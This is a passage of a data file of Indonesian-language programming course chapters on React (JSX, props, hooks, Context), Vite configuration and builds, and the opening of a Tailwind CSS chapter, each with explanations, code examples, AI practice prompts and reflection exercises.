dengan ratusan komponen, ini jadi spaghetti code.\\n\\n**React Datang dengan Pendekatan Deklaratif**\\nReact bilang: jangan bilang CARA melakukannya — bilang MAU APA. Kamu cukup deskripsikan UI seperti HTML, dan React akan mengurus semua perubahan DOM di belakang layar.\n\nKonsep ini disebut **declarative programming**.\\n\\n**Konsep Virtual DOM**\\nReact tidak langsung manipulasi DOM browser (yang lambat). Sebaliknya, React membuat salinan virtual DOM di memory — sebuah representasi JavaScript dari struktur HTML. Ketika state berubah, React membandingkan virtual DOM baru dengan yang lama (diffing), lalu hanya update bagian DOM yang berubah (reconciliation). Proses ini jauh lebih efisien daripada manipulasi DOM manual.\\n\\nBayangkan kamu punya papan tulis besar.\n\nDi vanilla JS, setiap ada perubahan kamu hapus semua tulisan dan tulis ulang dari nol. Dengan React, kamu hanya hapus dan tulis ulang bagian yang berubah saja. Lebih cepat, lebih efisien.\\n\\n**Komponen: Lego Block UI**\\nReact memecah UI menjadi komponen-komponen independen. Setiap komponen adalah potongan kode yang menggabungkan logic (JavaScript) dan tampilan (HTML-like syntax called JSX).\n\nKomponen bisa digunakan ulang, di-passing data, dan dikelola secara independen. Seperti lego: satu blok kecil bisa dipakai berkali-kali untuk membangun struktur besar.",

    codeExample: { language: "jsx", code: "// Vanilla JS - Imperatif (manual semua)\nconst app = document.getElementById('app');\nconst btn = document.createElement('button');\nbtn.textContent = 'Klik: 0';\nlet count = 0;\nbtn.addEventListener('click', () => {\n  count++;\n  btn.textContent = `Klik: ${count}`;\n});\napp.appendChild(btn);\n\n// React - Deklaratif (deskripsikan saja)\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <button onClick={() => setCount(count + 1)}>\n      Klik: {count}\n    </button>\n  );\n}" },

    explainAlong: "Kode atas (Vanilla): Tiap perubahan harus manual update DOM. Kode bawah (React): Cukup deskripsikan UI, React urus update-nya.",

    aiPrompt: "Jelaskan perbedaan imperatif vs deklaratif dengan analogi selain restoran. Berikan contoh nyata kapan menggunakan React dan kapan vanilla JS masih cukup.",

    reflection: "Buka website yang kamu gunakan sehari-hari. Coba identifikasi bagian mana yang bisa dipecah menjadi komponen React (header, sidebar, feed, card, dll).",

  },

  {

    id: "16.2",

    moduleId: 16,

    chapterNum: "16.2",

    title: "JSX: HTML di Dalam JavaScript",

    subtitle: "Syntax khusus React yang menggabungkan UI dan logic",

    level: "Menengah",

    objectives: [

      "Memahami sintaks JSX dan kenapa butuh Babel",

      "Bisa menulis JSX dengan expression JavaScript",

      "Mengerti aturan JSX yang berbeda dari HTML",

    ],

    analogy: { diagram: "JSX = JavaScript + XML\n\nconst element = (\n  <div className=\"card\">\n    <h1>Halo, {nama}!</h1>\n    <p>Umur: {2024 - tahunLahir}</p>\n  </div>\n);\n\n{...} = expression JS masuk ke dalam markup", caption: "JSX memungkinkan JavaScript dan markup hidup dalam satu tempat" },

    explanation: "Salah satu hal yang paling membingungkan pemula React adalah JSX. Kenapa ada HTML di dalam JavaScript? Apakah ini valid? Bukannya harus dipisah?\\n\\nTenang, perasaan itu wajar.\n\nTapi begitu kamu paham filosofinya, JSX justru akan jadi superpower-mu.\\n\\n**Apa Itu JSX?**\\nJSX adalah syntax extension untuk JavaScript — yaitu cara menulis markup yang mirip HTML langsung di dalam file JavaScript.\n\nIni BUKAN HTML murni, melainkan sintaks khusus yang nantinya di-compile menjadi fungsi React.createElement() oleh Babel.\\n\\nKatakanlah kamu ingin menampilkan div dengan class 'container' dan isi teks 'Halo'.\n\nDi vanilla JS:\\n```\\nconst div = document.createElement('div');\\ndiv.className = 'container';\\ndiv.textContent = 'Halo';\\n```\\n\\nDi JSX:\\n```\\nconst element = <div className=\\\"container\\\">Halo</div>;\\n```\\n\\nJauh lebih bersih dan mudah dibaca,\n\nKan?\\n\\n**JSX Adalah Expression JavaScript**\\nIni penting: JSX bukan string, bukan template engine — JSX adalah expression JavaScript yang valid.\n\nArtinya kamu bisa menyimpannya di variabel, passing ke fungsi, return dari fungsi, atau gunakan di dalam if/for.\\n\\n**Curly Braces: Portal ke JavaScript**\\nDi JSX,\n\nTanda kurung kurawal {} adalah 'portal' yang memungkinkan kamu menyisipkan expression JavaScript apa pun ke dalam markup.\n\nMau nampilin variabel? {}. Mau operasi matematika? {}. Mau conditional? {}.\\n\\n**Aturan JSX yang Beda dari HTML**\\nAda beberapa perbedaan penting:\\n1. class → className (karena 'class' adalah keyword JavaScript)\\n2. for → htmlFor (karena 'for' adalah keyword JavaScript)\\n3. Atribut camelCase: onclick → onClick, tabindex → tabIndex\\n4.\n\nSemua tag harus ditutup: <img />, <br />, <input />\\n5. Hanya bisa return satu root element (gunakan <>...</> fragment jika perlu)\\n\\n**Kenapa Tidak Dipisah?**\\nDi masa lalu, kita dipaksa pisah HTML, CSS, dan JS di file terpisah. Tapi tim Facebook yang membuat React menyadari: UI dan logic sebenarnya saling terkait erat. Ketika state berubah, UI berubah.\n\nKetika event terjadi, logic berjalan. Memisahkannya justru membuat kita bolak-balik antar file tanpa henti. JSX membiarkan kita menggabungkan keduanya dalam satu komponen yang cohesive.",

    codeExample: { language: "jsx", code: "// JSX dengan expression JavaScript\nfunction ProfileCard({ nama, umur, avatar, isOnline }) {\n  return (\n    <div className=\"profile-card\">\n      {/* Expression di dalam {} */}\n      <img src={avatar} alt={`Foto ${nama}`} />\n      <h2>{nama.toUpperCase()}</h2>\n      <p>Umur: {umur} tahun</p>\n      <p>Tahun lahir: {new Date().getFullYear() - umur}</p>\n      \n      {/* Conditional rendering */}\n      {isOnline ? (\n        <span className=\"badge online\">Online</span>\n      ) : (\n        <span className=\"badge offline\">Offline</span>\n      )}\n      \n      {/* Array rendering */}\n      <ul>\n        {['React', 'Node', 'TypeScript'].map(skill => (\n          <li key={skill}>{skill}</li>\n        ))}\n      </ul>\n    </div>\n  );\n}" },

    explainAlong: "Baris 7: toUpperCase() dipanggil langsung di JSX. Baris 10: Operasi matematika tahun. Baris 13-17: Ternary operator untuk conditional rendering. Baris 20-22: map() untuk render array.",

    aiPrompt: "Jelaskan konsep JSX dengan analogi. Buat komponen Card yang menerima props title, description, dan tags (array), lalu render dengan JSX.",

    reflection: "Coba tulis ulang satu komponen HTML murni (yang sudah kamu buat sebelumnya) menjadi komponen JSX. Apa saja perbedaannya?",

  },

  {

    id: "16.3",

    moduleId: 16,

    chapterNum: "16.3",

    title: "Component dan Props: Bangun UI seperti Lego",

    subtitle: "Pecah UI menjadi komponen reusable dan passing data dengan props",

    level: "Menengah",

    objectives: [

      "Memahami konsep komponen React",

      "Bisa membuat dan menggunakan props",

      "Mengerti one-way data flow dan immutability props",

    ],

    analogy: { diagram: "App (Parent)\n├── Header title=\"Tokoku\" \\n├── Sidebar items={[...]} \\n└── MainContent\n    ├── PostList posts={[...]} \\n    └── Footer year={2024} \\n\nProps = Data mengalir dari atas ke bawah (seperti air)", caption: "Komponen adalah fungsi JavaScript yang menerima props dan mengembalikan JSX" },

    explanation: "Bayangkan kamu membuka website e-commerce. Ada header dengan logo dan menu, ada sidebar kategori, ada grid produk, ada card produk, ada footer. Semua ini bisa kamu buat dalam satu file raksasa dengan ribuan baris kode. Tapi itu akan jadi mimpi buruk saat debugging.\\n\\n**Pendekatan React: Pecah dan Taklukkan**\\nReact mengajarkan kita memecah UI menjadi komponen-komponen kecil yang independen.\n\nSetiap komponen punya tanggung jawab tunggal dan bisa digunakan ulang di berbagai tempat.\\n\\n**Apa Itu Komponen?**\\nKomponen React adalah fungsi (atau class) JavaScript yang menerima input berupa props dan mengembalikan JSX untuk dirender. Simple kan? Seperti fungsi biasa: input → proses → output.\\n\\n```\\nfunction Welcome(props) {\\n  return <h1>Halo, {props.nama}</h1>;\\n}\\n```\\n\\nKomponen ini menerima props dengan properti 'nama' dan mengembalikan h1 dengan teks sapaan. Komponen bisa digunakan seperti tag HTML:\\n```\\n<Welcome nama=\\\"Budi\\\" />\\n<Welcome nama=\\\"Ani\\\" />\\n```\\n\\n**Props: Data Masuk ke Komponen**\\nProps (kependekan dari properties) adalah cara kita melewatkan data dari komponen induk ke komponen anak.\n\nProps bersifat read-only — komponen anak tidak boleh mengubah props yang diterimanya. Ini disebut one-way data flow.\\n\\nAnaloginya seperti mengirim paket. Orang tua (parent) mengemas paket (props) dan mengirimnya ke anak (child). Anak bisa membuka dan melihat isinya, tapi tidak bisa mengubah paket yang sudah dikirim.\n\nKalau anak butuh kirim data balik, gunakan callback function.\\n\\n**Komposisi Komponen**\\nKomponen bisa menampung komponen lain di dalamnya.\n\nIni memungkinkan kita membangun UI yang kompleks dari komponen-komponen sederhana.\\n\\n**Best Practice Penamaan**\\n- Komponen selalu PascalCase (Button, NavBar, UserCard)\\n- File sesuai nama komponen (Button.jsx,\n\nNavBar.jsx)\\n- Satu file satu komponen utama\\n\\n**Kapan Memecah Komponen?**\\n- Ketika UI berulang di beberapa tempat\\n- Ketika satu komponen terlalu besar (>100 baris)\\n- Ketika ada bagian yang independent dan bisa di-test sendiri\\n- Ketika state dan logic hanya relevan untuk bagian tertentu",

    codeExample: { language: "jsx", code: "// Komponen reusable Button\nfunction Button({ variant, size, children, onClick, disabled }) {\n  const base = 'px-4 py-2 rounded font-medium transition';\n  const variants = {\n    primary: 'bg-blue-600 text-white hover:bg-blue-700',\n    secondary: 'bg-gray-200 text-gray-800 hover:bg-gray-300',\n    danger: 'bg-red-600 text-white hover:bg-red-700',\n  };\n  const sizes = { sm: 'text-sm', md: 'text-base', lg: 'text-lg px-6 py-3' };\n  \n  return (\n    <button\n      className={`${base} ${variants[variant]} ${sizes[size]}`}\n      onClick={onClick}\n      disabled={disabled}\n    >\n      {children}\n    </button>\n  );\n}\n\n// Penggunaan\n<Button variant=\"primary\" size=\"md\" onClick={handleSave}>\n  Simpan\n</Button>\n<Button variant=\"danger\" size=\"sm\" onClick={handleDelete}>\n  Hapus\n</Button>\n<Button variant=\"secondary\" size=\"lg\" disabled>\n  Loading...\n</Button>" },

    explainAlong: "Komponen Button menerima props: variant (menentukan warna), size (ukuran), children (konten di dalam tag), onClick (event handler), dan disabled.",

    aiPrompt: "Buat komponen Card yang terdiri dari CardHeader, CardBody, dan CardFooter. Komponen Card menerima props title, content, dan footer. Gunakan komposisi.",

    reflection: "Lihat website favoritmu. Gambarkan hierarki komponennya seperti tree. Mana yang parent, mana yang child, dan apa props yang mungkin mengalir antar komponen?",

  },

  {

    id: "16.4",

    moduleId: 16,

    chapterNum: "16.4",

    title: "Hooks: useState dan useEffect",

    subtitle: "Kelola state dan side effects di komponen fungsi",

    level: "Menengah",

    objectives: [

      "Menguasai useState untuk state lokal",

      "Menguasai useEffect untuk side effects",

      "Mengerti dependency array dan cleanup function",

    ],

    analogy: { diagram: "useState: Penyimpanan data komponen\nconst [nilai, setNilai] = useState(awal);\n\nuseEffect: Jalankan kode saat ada perubahan\nuseEffect(() => { ... }, [dependencies]);\n\nAnalogi: useState = memori komponen, useEffect = reaksi terhadap perubahan", caption: "Hooks membuat komponen fungsi punya kemampuan seperti class component" },

    explanation: "Sebelum 2019, komponen React yang punya state harus ditulis sebagai class. Class component punya metode khusus seperti componentDidMount, componentDidUpdate, dan this.state. Tapi class component rumit, verbose, dan sulit di-reuse logic antar komponen.\\n\\n**React Hooks: Revolusi 2019**\\nHooks adalah fungsi khusus yang memungkinkan komponen fungsi 'menyambungkan' ke fitur React: state, lifecycle, dan fitur lain. Dengan hooks, kita bisa tulis komponen yang lebih sederhana tapi punya kemampuan penuh.\\n\\n**useState: Memori Komponen**\\nuseState adalah hook paling dasar dan paling sering dipakai.\n\nFungsinya: memberikan komponen kemampuan untuk 'mengingat' data antar render.\\n\\n```\\nconst [count, setCount] = useState(0);\\n```\\n\\nuseState mengembalikan sepasang nilai: state saat ini (count) dan fungsi untuk mengubahnya (setCount).\n\nArgument pertama (0) adalah nilai awal.\n\nSetiap kali setCount dipanggil, React akan re-render komponen dengan nilai baru.\\n\\nAnaloginya seperti remote TV. useState adalah memori TV yang menyimpan channel saat ini. setChannel adalah tombol remote — ketika ditekan, TV (komponen) bereaksi dan menampilkan channel baru.\\n\\n**useEffect: Reaksi terhadap Perubahan**\\nuseEffect adalah hook untuk menjalankan kode sebagai reaksi terhadap perubahan — seperti mengambil data API, subscribe ke event,\n\nAtau manipulasi DOM manual.\\n\\n```\\nuseEffect(() => {\\n  // Kode di sini berjalan setelah render\\n  console.log('Komponen dimount atau count berubah');\\n  \\n  // Cleanup function (opsional)\\n  return () => {\\n    console.log('Cleanup sebelum effect berikutnya');\\n  };\\n}, [count]); // Hanya jalankan kalau 'count' berubah\\n```\\n\\nDependency array (argumen kedua) adalah kunci penting:\\n- [] (kosong): Effect hanya berjalan sekali saat mount\\n- [count]: Effect berjalan saat mount DAN saat count berubah\\n- Tanpa array: Effect berjalan setiap kali render\\n\\n**Cleanup Function**\\nBeberapa effect perlu 'beres-beres' sebelum effect berikutnya berjalan atau sebelum komponen di-unmount.\n\nContoh: unsubscribe dari WebSocket, hapus event listener, clear timer.\n\nCleanup function ditulis sebagai return value dari useEffect.\\n\\n**Aturan Hooks**\\n1. Hanya panggil hooks di level teratas (bukan di dalam if/loop)\\n2. Hanya panggil hooks dari komponen React atau custom hooks\\n3. Nama custom hooks harus diawali 'use'",

    codeExample: { language: "jsx", code: "import { useState, useEffect } from 'react';\n\nfunction TodoApp() {\n  const [todos, setTodos] = useState([]);\n  const [input, setInput] = useState('');\n\n  // Load dari localStorage saat mount\n  useEffect(() => {\n    const saved = localStorage.getItem('todos');\n    if (saved) setTodos(JSON.parse(saved));\n  }, []);\n\n  // Simpan ke localStorage saat todos berubah\n  useEffect(() => {\n    localStorage.setItem('todos', JSON.stringify(todos));\n  }, [todos]);\n\n  const addTodo = () => {\n    if (!input.trim()) return;\n    setTodos([...todos, { id: Date.now(), text: input, done: false }]);\n    setInput('');\n  };\n\n  return (\n    <div>\n      <input\n        value={input}\n        onChange={e => setInput(e.target.value)}\n        placeholder=\"Tambah todo...\"\n      />\n      <button onClick={addTodo}>Tambah</button>\n      <ul>\n        {todos.map(t => (\n          <li key={t.id}>{t.text}</li>\n        ))}\n      </ul>\n    </div>\n  );\n}" },

    explainAlong: "Baris 2-3: State todos dan input diinisialisasi. Baris 6-9: Effect pertama load data saat mount (deps []). Baris 12-14: Effect kedua simpan data saat todos berubah. Baris 17-20: Fungsi addTodo update state.",

    aiPrompt: "Buat komponen Timer dengan useState dan useEffect. Timer menghitung mundur dari nilai yang diinput user. Gunakan setInterval di useEffect dan cleanup function untuk clearInterval.",

    reflection: "Experiment: Ganti dependency array di useEffect. Apa yang terjadi kalau [] dihilangkan? Apa yang terjadi kalau [todos] diganti [input]?",

  },

  {

    id: "16.5",

    moduleId: 16,

    chapterNum: "16.5",

    title: "React Lanjutan: Custom Hooks dan Context",

    subtitle: "Ekstrak logic reusable dan bagikan state global",

    level: "Menengah–Lanjut",

    objectives: [

      "Bisa membuat custom hooks",

      "Memahami Context API untuk state global",

      "Mengerti kapan pakai Context vs props drilling",

    ],

    analogy: { diagram: "Props Drilling (Sebelum):\nApp → A → B → C → D (props diturunkan berkali-kali)\n\nContext (Sesudah):\nApp (Provider) → A, B, C, D (langsung ambil data)", caption: "Custom Hooks = ekstrak logic, Context = bagikan data tanpa props drilling" },

    explanation: "Setelah menguasai useState dan useEffect, kamu akan menyadari dua masalah dalam aplikasi React:\\n\\n1. **Logic yang berulang**: Beberapa komponen butuh logic yang sama (fetch data, localStorage, form handling)\\n2. **Props drilling**: Data harus diturunkan melalui 3-4 level komponen hanya untuk sampai ke komponen yang butuh\\n\\n**Custom Hooks: Ekstrak dan Reuse Logic**\\nCustom hooks adalah fungsi JavaScript biasa yang namanya diawali 'use' dan bisa memanggil hooks lain di dalamnya. Mereka memungkinkan kita mengekstrak logic dari komponen sehingga bisa digunakan ulang.\\n\\nAnaloginya seperti power bank.\n\nSebelumnya setiap gadget punya kabel charger sendiri. Custom hooks seperti membuat satu power bank universal yang bisa nge-charge semua gadget — satu solusi untuk banyak masalah.\\n\\n**Context API: State Global tanpa Props Drilling**\\nContext menyediakan cara untuk berbagi data antar komponen tanpa harus melewatkan props secara manual di setiap level.\\n\\nBayangkan kamu di pesta besar. Ada pengumuman penting. Tanpa microphone, kamu harus bisikkan ke orang terdekat, dia bisikkan ke orang berikutnya, dan seterusnya — lambat dan berisiko salah (props drilling).\n\nDengan microphone (Context), semua orang langsung dengar pengumuman dari sumbernya.\\n\\n**Cara Kerja Context:**\\n1. Buat context dengan createContext()\\n2. Bungkus aplikasi dengan Provider\\n3. Komponen child ambil data dengan useContext()\\n\\n**Kapan Pakai Context?**\\n- Theme (dark/light mode)\\n- User authentication data\\n- Language/locale settings\\n- Data yang dibutuhkan banyak komponen di berbagai level\\n\\n**Kapan TIDAK Pakai Context?**\\n- State yang hanya dibutuhkan 1-2 komponen (useState cukup)\\n- State yang sering berubah (performance issue)\\n- Solusi untuk semua masalah state (gunakan state management library untuk kasus kompleks)",

    codeExample: { language: "jsx", code: "// Custom Hook: useLocalStorage\nfunction useLocalStorage(key, initialValue) {\n  const [value, setValue] = useState(() => {\n    try {\n      const item = localStorage.getItem(key);\n      return item ? JSON.parse(item) : initialValue;\n    } catch {\n      return initialValue;\n    }\n  });\n\n  useEffect(() => {\n    localStorage.setItem(key, JSON.stringify(value));\n  }, [key, value]);\n\n  return [value, setValue];\n}\n\n// Context: ThemeContext\nconst ThemeContext = createContext();\n\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n  const toggle = () => setTheme(t => t === 'light' ? 'dark' : 'light');\n  \n  return (\n    <ThemeContext.Provider value={{ theme, toggle }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\n// Penggunaan di komponen child\nfunction ThemedButton() {\n  const { theme, toggle } = useContext(ThemeContext);\n  return (\n    <button onClick={toggle}>\n      Mode: {theme}\n    </button>\n  );\n}" },

    explainAlong: "useLocalStorage: Hook reusable untuk persist state ke localStorage. ThemeProvider: Context provider yang membungkus aplikasi. ThemedButton: Komponen child yang consume context dengan useContext.",

    aiPrompt: "Buat custom hook useFetch yang menerima URL dan mengembalikan { data, loading, error }. Gunakan useEffect untuk fetch dan useState untuk menyimpan hasil.",

    reflection: "Identifikasi di aplikasimu: ada berapa logic yang berulang antar komponen? Itu adalah kandidat custom hooks.",

  },

  {

    id: "16.6",

    moduleId: 16,

    chapterNum: "16.6",

    title: "Vite: Build Tool Super Cepat",

    subtitle: "Gantikan webpack dengan dev server instan dan build yang optimal",

    level: "Menengah",

    objectives: [

      "Memahami masalah webpack yang dipecahkan Vite",

      "Bisa setup project React dengan Vite",

      "Mengerti HMR (Hot Module Replacement)",

    ],

    analogy: { diagram: "Webpack: Bundle semua → mulai (lama)\n  [Semua file] → Bundle → Dev server siap\n\nVite: Native ESM → langsung jalan (cepat)\n  [src/main.jsx] → Browser import langsung → Instan", caption: "Vite menggunakan Native ESM browser sehingga dev server siap dalam milidetik" },

    explanation: "Kalau kamu pernah setup project React dengan Create React App (CRA), mungkin kamu familiar dengan menunggu 10-30 detik setiap kali jalankan npm start. Begitu aplikasi besar, tunggu ini makin lama. Kenapa? Karena CRA menggunakan webpack yang harus membungkus (bundle) SELURUH kode aplikasimu sebelum dev server siap.\\n\\n**Masalah dengan Bundler Tradisional**\\nWebpack (dan bundler serupa) bekerja dengan cara: baca semua file aplikasi → proses dan transform → gabung jadi satu bundle besar → baru serve ke browser.\n\nDi aplikasi besar dengan ribuan file, proses ini bisa memakan waktu sangat lama. Setiap kali kamu edit satu file, webpack harus rebuild sebagian — makin besar aplikasi, makin lambat.\\n\\n**Vite: Pendekatan Baru**\\nVite (bahasa Prancis untuk 'cepat') mengambil pendekatan berbeda. Alih-alih mem-bundle saat development, Vite memanfaatkan **Native ES Modules** — fitur modern browser yang bisa meng-import file JavaScript langsung tanpa di-bundle terlebih dahulu.\\n\\nAnaloginya seperti perbedaan antara perpustakaan tradisional dan perpustakaan modern. Di perpustakaan tradisional, kamu pinjam buku → librarian cari, proses, baru kasih (bundler).\n\nDi perpustakaan modern, kamu ambil buku langsung dari rak, scan QR, selesai (Vite).\\n\\n**Cara Kerja Vite:**\\n1. Dev server: Serve file langsung menggunakan native ESM browser\\n2. Dependencies: Tetap di-bundle (menggunakan esbuild — bundler Go yang super cepat)\\n3. Source code: Tidak di-bundle, di-serve as-is via ESM\\n4.\n\nProduction: Menggunakan Rollup untuk bundle optimal\\n\\n**Fitur Unggulan Vite**\\n- **Dev server instan**: Project React siap dalam <1 detik, regardless ukuran\\n- **HMR (Hot Module Replacement)**: Edit file, perubahan muncul langsung tanpa refresh halaman\\n- **Out-of-the-box**: Support TypeScript,\n\nJSX, CSS modules, dan banyak lagi tanpa config\\n- **Optimized build**: Production bundle dengan code splitting otomatis\\n\\n**Setup Project dengan Vite**\\n```\\nnpm create vite@latest my-app -- --template react\\ncd my-app && npm install && npm run dev\\n```\\n\\nSelesai!\n\nTidak perlu eject, tidak perlu config webpack yang rumit.",

    codeExample: { language: "bash", code: "# Setup project React + Vite\nnpm create vite@latest my-project -- --template react-ts\n\ncd my-project\nnpm install\nnpm run dev\n\n# Struktur folder\nmy-project/\n├── public/          # Asset statis\n├── src/\n│   ├── assets/      # Gambar, font, dll\n│   ├── App.tsx      # Komponen root\n│   ├── main.tsx     # Entry point\n│   └── index.css    # Global styles\n├── index.html       # HTML template\n├── vite.config.ts   # Konfigurasi Vite\n├── tsconfig.json    # TypeScript config\n└── package.json" },

    explainAlong: "Template react-ts memberikan setup React + TypeScript siap pakai. Folder public untuk asset statis, src untuk kode aplikasi. vite.config.ts untuk kustomisasi.",

    aiPrompt: "Buat project baru dengan Vite + React + TypeScript. Tambahkan plugin @vitejs/plugin-react dan jalankan dev server. Catat berapa detik dev server siap.",

    reflection: "Bandinkan waktu startup antara project Vite dan CRA. Vite seharusnya jauh lebih cepat.",

  },

  {

    id: "16.7",

    moduleId: 16,

    chapterNum: "16.7",

    title: "Konfigurasi Vite dan Environment Variables",

    subtitle: "Kustomisasi build, path alias, dan variabel environment",

    level: "Menengah",

    objectives: [

      "Bisa mengkonfigurasi vite.config.ts",

      "Mengerti path alias dan cara setupnya",

      "Tahu cara pakai environment variables di Vite",

    ],

    analogy: { diagram: "vite.config.ts:\n  plugins: [react()]\n  resolve: { alias: { '@': '/src' } }\n  server: { port: 3000 }\n\n.env:\n  VITE_API_URL=https://api.example.com\n\nKode:\n  const apiUrl = import.meta.env.VITE_API_URL;", caption: "Vite dikonfigurasi via vite.config.ts, env vars menggunakan prefix VITE_" },

    explanation: "Setelah berhasil setup project Vite, langkah selanjutnya adalah konfigurasi. Vite menggunakan file vite.config.ts (atau vite.config.js) untuk segala pengaturan. File ini cukup powerful — kamu bisa mengatur hampir semua aspek build process.\\n\\n**Struktur Config Dasar**\\nFile config default yang di-generate Vite sudah cukup untuk kebanyakan project. Tapi seiring aplikasi bertumbuh, kamu perlu menambahkan konfigurasi.\\n\\n**Path Alias: Jalan Pintas Import**\\nSalah satu konfigurasi paling penting adalah path alias.\n\nTanpa alias, import komponen terasa seperti menulis alamat lengkap setiap kali:\\n```\\nimport Button from '../../../../components/Button';\\n```\\n\\nDengan alias @ yang menunjuk ke folder src:\\n```\\nimport Button from '@/components/Button';\\n```\\n\\nJauh lebih bersih! Path alias mengurangi cognitive load dan membuat refactoring lebih mudah — kamu bisa pindahkan file tanpa merusak import path.\\n\\n**Environment Variables**\\nVite memiliki sistem env vars yang berbeda dari CRA. Semua variabel yang ingin di-expose ke client harus diawali VITE_. Ini adalah security measure — Vite tidak akan expose variabel tanpa prefix tersebut ke browser.\\n\\nCara mengaksesnya:\\n```\\nconst apiUrl = import.meta.env.VITE_API_URL;\\nconst isDev = import.meta.env.DEV; // true di dev mode\\nconst isProd = import.meta.env.PROD; // true di production\\n```\\n\\n**Mode Development vs Production**\\nVite otomatis mengatur mode berdasarkan command yang dijalankan:\\n- npm run dev → mode 'development'\\n- npm run build → mode 'production'\\n\\nMode ini mempengaruhi behavior: source map, minification, env var loading, dan plugin behavior.\n\nKamu juga bisa buat mode custom seperti 'staging'.\\n\\n**Server Config**\\nVite dev server bisa dikustomisasi: port, proxy untuk API, HTTPS, CORS, dan lainnya. Proxy sangat berguna saat development — kamu bisa redirect /api ke backend server tanpa perlu khawatir CORS.",

    codeExample: { language: "typescript", code: "// vite.config.ts\nimport { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\nimport path from 'path';\n\nexport default defineConfig(({ mode }) => ({\n  plugins: [react()],\n  resolve: {\n    alias: {\n      '@': path.resolve(__dirname, './src'),\n      '@components': path.resolve(__dirname, './src/components'),\n      '@hooks': path.resolve(__dirname, './src/hooks'),\n      '@utils': path.resolve(__dirname, './src/utils'),\n    },\n  },\n  server: {\n    port: 3000,\n    proxy: {\n      '/api': {\n        target: 'http://localhost:8080',\n        changeOrigin: true,\n      },\n    },\n  },\n  build: {\n    sourcemap: mode === 'development',\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          vendor: ['react', 'react-dom'],\n        },\n      },\n    },\n  },\n}));" },

    explainAlong: "Baris 8-13: Path alias untuk import lebih bersih. Baris 16-20: Proxy /api ke backend. Baris 23-28: Code splitting manual untuk vendor chunks.",

    aiPrompt: "Setup path alias @ untuk folder src di project Vite-mu. Tambahkan juga proxy untuk /api ke backend local.",

    reflection: "Coba pindahkan satu komponen ke folder berbeda. Dengan path alias, seharusnya tidak perlu mengubah import path.",

  },

  {

    id: "16.8",

    moduleId: 16,

    chapterNum: "16.8",

    title: "Plugin Ekosistem dan Build Production",

    subtitle: "Extend Vite dengan plugin dan optimasi build untuk production",

    level: "Menengah–Lanjut",

    objectives: [

      "Mengerti ekosistem plugin Vite",

      "Bisa optimasi build production",

      "Tahu cara menganalisis bundle size",

    ],

    analogy: { diagram: "Dev (cepat):     ESM → Browser → Langsung jalan\nBuild (optimal):  Rollup → Minify → Code Split → Output\n\nPlugin Vite:\n├── @vitejs/plugin-react (JSX + HMR)\n├── @vitejs/plugin-legacy (browser lama)\n├── vite-plugin-pwa (service worker)\n└── vite-plugin-svg (import SVG sebagai React component)", caption: "Vite untuk dev (cepat), Rollup untuk production (optimal)" },

    explanation: "Vite memiliki ekosistem plugin yang kaya. Memahami plugin-plugin penting akan membantumu membangun aplikasi production-ready.\\n\\n**Plugin Wajib**\\n- **@vitejs/plugin-react**: Plugin resmi untuk React. Handle JSX transform, Fast Refresh (HMR), dan Babel integration. Sudah termasuk saat create project dengan template react.\\n- **@vitejs/plugin-legacy**: Generate bundle untuk browser lama yang tidak support ESM (IE11, browser lama).\n\nOtomatis inject polyfill yang dibutuhkan.\\n- **vite-plugin-pwa**: Mengubah aplikasi menjadi Progressive Web App dengan service worker, manifest, dan strategi caching.\\n- **vite-plugin-svgr**: Import file SVG sebagai React component. Bisa styling dengan props, bukan cuma static image.\\n\\n**Optimasi Build Production**\\nSaat menjalankan npm run build, Vite menggunakan Rollup untuk menghasilkan bundle production. Beberapa optimasi otomatis:\\n\\n1. **Minification**: Kode diperkecil dengan menghapus whitespace, rename variabel, dll\\n2.\n\n**Tree Shaking**: Hapus kode yang tidak digunakan (dead code elimination)\\n3. **Code Splitting**: Pecah bundle jadi chunks kecil yang di-load on-demand\\n4. **Asset Optimization**: Gambar di-compress, CSS di-minify, font di-subset\\n\\n**Analisis Bundle Size**\\nUntuk menganalisis ukuran bundle dan menemukan modul besar:\\n```\\nnpm install -D rollup-plugin-visualizer\\n```\\n\\nTambahkan ke vite.config.ts, lalu build. Akan dihasilkan file HTML interaktif yang menampilkan treemap bundle — sangat berguna untuk mengidentifikasi dependensi yang terlalu besar.\\n\\n**Best Practices Build**\\n1.\n\nSplit vendor dan app code (manualChunks)\\n2. Lazy load route dengan React.lazy()\\n3. Import library secara selective (import specific functions, bukan whole library)\\n4. Monitor bundle size secara berkala",

    codeExample: { language: "typescript", code: "// vite.config.ts dengan plugin lengkap\nimport { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\nimport { VitePWA } from 'vite-plugin-pwa';\nimport svgr from 'vite-plugin-svgr';\nimport { visualizer } from 'rollup-plugin-visualizer';\n\nexport default defineConfig(({ mode }) => ({\n  plugins: [\n    react(),\n    svgr(),\n    VitePWA({\n      registerType: 'autoUpdate',\n      manifest: {\n        name: 'My App',\n        theme_color: '#ffffff',\n      },\n    }),\n    mode === 'analyze' && visualizer({ open: true }),\n  ],\n  build: {\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          react: ['react', 'react-dom'],\n          router: ['react-router-dom'],\n        },\n      },\n    },\n  },\n}));\n\n# Analisis bundle\nnpx vite build --mode analyze" },

    explainAlong: "VitePWA: Ubah jadi PWA dengan service worker. visualizer: Generate visualisasi bundle. manualChunks: Pisah react dan router ke chunk terpisah.",

    aiPrompt: "Install rollup-plugin-visualizer dan analisis bundle size project-mu. Identifikasi dependensi terbesar dan pertimbangkan alternatif yang lebih ringan.",

    reflection: "Cek ukuran bundle production-mu. Apakah ada library yang surprisingly besar? Itu target optimasi pertama.",

  },

  {

    id: "16.9",

    moduleId: 16,

    chapterNum: "16.9",

    title: "Tailwind CSS: Utility-First Styling",

    subtitle: "Paradigma baru: styling dengan utility class, bukan CSS tradisional",

    level: "Menengah",

    objectives: [

      "Memahami filosofi utility-first CSS",

      "Bisa setup Tailwind di project React",

      "Menguasai utility class dasar",

    ],

